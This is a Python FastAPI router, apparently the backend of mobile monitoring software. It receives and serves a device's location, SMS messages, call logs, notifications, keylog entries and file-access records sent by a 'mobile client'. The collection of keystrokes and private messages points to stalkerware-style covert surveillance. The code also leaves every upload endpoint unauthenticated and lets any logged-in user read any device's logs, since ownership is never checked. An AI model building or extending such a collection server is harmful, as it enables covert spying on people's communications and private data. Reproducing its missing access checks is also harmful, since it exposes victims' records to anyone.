from typing import List, Optional
from fastapi import APIRouter, Depends, HTTPException, Query, status
from sqlalchemy.ext.asyncio import AsyncSession

from app.core.deps import get_db, get_current_user
from app.db import models
from app.schemas.log import (
    LocationLogCreate,
    SmsLogCreate,
    CallLogCreate,
    NotificationLogCreate,
    KeyLogCreate,
    FileLogCreate,
    LocationLogResponse,
    SmsLogResponse,
    CallLogResponse,
    NotificationLogResponse,
    KeyLogResponse,
    FileLogResponse
)

router = APIRouter()

# Location logs
@router.post("/logs/location", status_code=status.HTTP_201_CREATED)
async def log_location(
    location: LocationLogCreate,
    db: AsyncSession = Depends(get_db)
):
    """
    Log a device location. This endpoint is used by the mobile client.
    """
    # Verify device exists
    device = await models.Device.get_by_id(db, device_id=location.device_id)
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")
    
    # Create location log
    new_location = models.DeviceLocation(**location.dict())
    
    db.add(new_location)
    await db.commit()
    
    return {"status": "logged"}

# SMS logs
@router.post("/logs/sms", status_code=status.HTTP_201_CREATED)
async def log_sms(
    sms: SmsLogCreate,
    db: AsyncSession = Depends(get_db)
):
    """
    Log an SMS message. This endpoint is used by the mobile client.
    """
    # Verify device exists
    device = await models.Device.get_by_id(db, device_id=sms.device_id)
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")
    
    # Create SMS log
    new_sms = models.SmsLog(**sms.dict())
    
    db.add(new_sms)
    await db.commit()
    
    return {"status": "logged"}

@router.get("/devices/{device_id}/logs/sms", response_model=List[SmsLogResponse])
async def get_sms_logs(
    device_id: str,
    time_range: Optional[str] = Query("24h", description="Time range (24h, 7d, 30d, all)"),
    limit: Optional[int] = Query(100, description="Maximum number of logs to return"),
    current_user: models.User = Depends(get_current_user),
    db: AsyncSession = Depends(get_db)
):
    """
    Get SMS logs for a specific device.
    """
    # Verify device exists
    device = await models.Device.get_by_id(db, device_id=device_id)
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")
    
    # Calculate time filter based on time_range
    time_filter = models.get_time_filter(time_range)
    
    # Get SMS logs
    logs = await models.SmsLog.get_by_device_id(
        db, 
        device_id=device_id, 
        time_filter=time_filter,
        limit=limit
    )
    
    return logs

# Call logs
@router.post("/logs/call", status_code=status.HTTP_201_CREATED)
async def log_call(
    call: CallLogCreate,
    db: AsyncSession = Depends(get_db)
):
    """
    Log a phone call. This endpoint is used by the mobile client.
    """
    # Verify device exists
    device = await models.Device.get_by_id(db, device_id=call.device_id)
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")
    
    # Create call log
    new_call = models.CallLog(**call.dict())
    
    db.add(new_call)
    await db.commit()
    
    return {"status": "logged"}

@router.get("/devices/{device_id}/logs/call", response_model=List[CallLogResponse])
async def get_call_logs(
    device_id: str,
    time_range: Optional[str] = Query("24h", description="Time range (24h, 7d, 30d, all)"),
    limit: Optional[int] = Query(100, description="Maximum number of logs to return"),
    current_user: models.User = Depends(get_current_user),
    db: AsyncSession = Depends(get_db)
):
    """
    Get call logs for a specific device.
    """
    # Verify device exists
    device = await models.Device.get_by_id(db, device_id=device_id)
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")
    
    # Calculate time filter based on time_range
    time_filter = models.get_time_filter(time_range)
    
    # Get call logs
    logs = await models.CallLog.get_by_device_id(
        db, 
        device_id=device_id, 
        time_filter=time_filter,
        limit=limit
    )
    
    return logs

# Notification logs
@router.post("/logs/notification", status_code=status.HTTP_201_CREATED)
async def log_notification(
    notification: NotificationLogCreate,
    db: AsyncSession = Depends(get_db)
):
    """
    Log a device notification. This endpoint is used by the mobile client.
    """
    # Verify device exists
    device = await models.Device.get_by_id(db, device_id=notification.device_id)
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")
    
    # Create notification log
    new_notification = models.NotificationLog(**notification.dict())
    
    db.add(new_notification)
    await db.commit()
    
    return {"status": "logged"}

@router.get("/devices/{device_id}/logs/notification", response_model=List[NotificationLogResponse])
async def get_notification_logs(
    device_id: str,
    time_range: Optional[str] = Query("24h", description="Time range (24h, 7d, 30d, all)"),
    limit: Optional[int] = Query(100, description="Maximum number of logs to return"),
    current_user: models.User = Depends(get_current_user),
    db: AsyncSession = Depends(get_db)
):
    """
    Get notification logs for a specific device.
    """
    # Verify device exists
    device = await models.Device.get_by_id(db, device_id=device_id)
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")
    
    # Calculate time filter based on time_range
    time_filter = models.get_time_filter(time_range)
    
    # Get notification logs
    logs = await models.NotificationLog.get_by_device_id(
        db, 
        device_id=device_id, 
        time_filter=time_filter,
        limit=limit
    )
    
    return logs

# Key logs
@router.post("/logs/keylog", status_code=status.HTTP_201_CREATED)
async def log_keylog(
    keylog: KeyLogCreate,
    db: AsyncSession = Depends(get_db)
):
    """
    Log a keylog entry. This endpoint is used by the mobile client.
    """
    # Verify device exists
    device = await models.Device.get_by_id(db, device_id=keylog.device_id)
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")
    
    # Create keylog entry
    new_keylog = models.KeyLog(**keylog.dict())
    
    db.add(new_keylog)
    await db.commit()
    
    return {"status": "logged"}

@router.get("/devices/{device_id}/logs/keylog", response_model=List[KeyLogResponse])
async def get_key_logs(
    device_id: str,
    time_range: Optional[str] = Query("24h", description="Time range (24h, 7d, 30d, all)"),
    limit: Optional[int] = Query(100, description="Maximum number of logs to return"),
    current_user: models.User = Depends(get_current_user),
    db: AsyncSession = Depends(get_db)
):
    """
    Get key logs for a specific device.
    """
    # Verify device exists
    device = await models.Device.get_by_id(db, device_id=device_id)
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")
    
    # Calculate time filter based on time_range
    time_filter = models.get_time_filter(time_range)
    
    # Get key logs
    logs = await models.KeyLog.get_by_device_id(
        db, 
        device_id=device_id, 
        time_filter=time_filter,
        limit=limit
    )
    
    return logs

# File access logs
@router.post("/logs/file-access", status_code=status.HTTP_201_CREATED)
async def log_file_access(
    file_access: FileLogCreate,
    db: AsyncSession = Depends(get_db)
):
    """
    Log a file access. This endpoint is used by the mobile client.
    """
    # Verify device exists
    device = await models.Device.get_by_id(db, device_id=file_access.device_id)
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")
    
    # Create file access log
    new_file_access = models.FileLog(**file_access.dict())
    
    db.add(new_file_access)
    await db.commit()
    
    return {"status": "logged"}

@router.get("/devices/{device_id}/logs/file", response_model=List[FileLogResponse])
async def get_file_logs(
    device_id: str,
    time_range: Optional[str] = Query("24h", description="Time range (24h, 7d, 30d, all)"),
    limit: Optional[int] = Query(100, description="Maximum number of logs to return"),
    current_user: models.User = Depends(get_current_user),
    db: AsyncSession = Depends(get_db)
):
    """
    Get file access logs for a specific device.
    """
    # Verify device exists
    device = await models.Device.get_by_id(db, device_id=device_id)
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")
    
    # Calculate time filter based on time_range
    time_filter = models.get_time_filter(time_range)
    
    # Get file logs
    logs = await models.FileLog.get_by_device_id(
        db, 
        device_id=device_id, 
        time_filter=time_filter,
        limit=limit
    )
    
    return logs
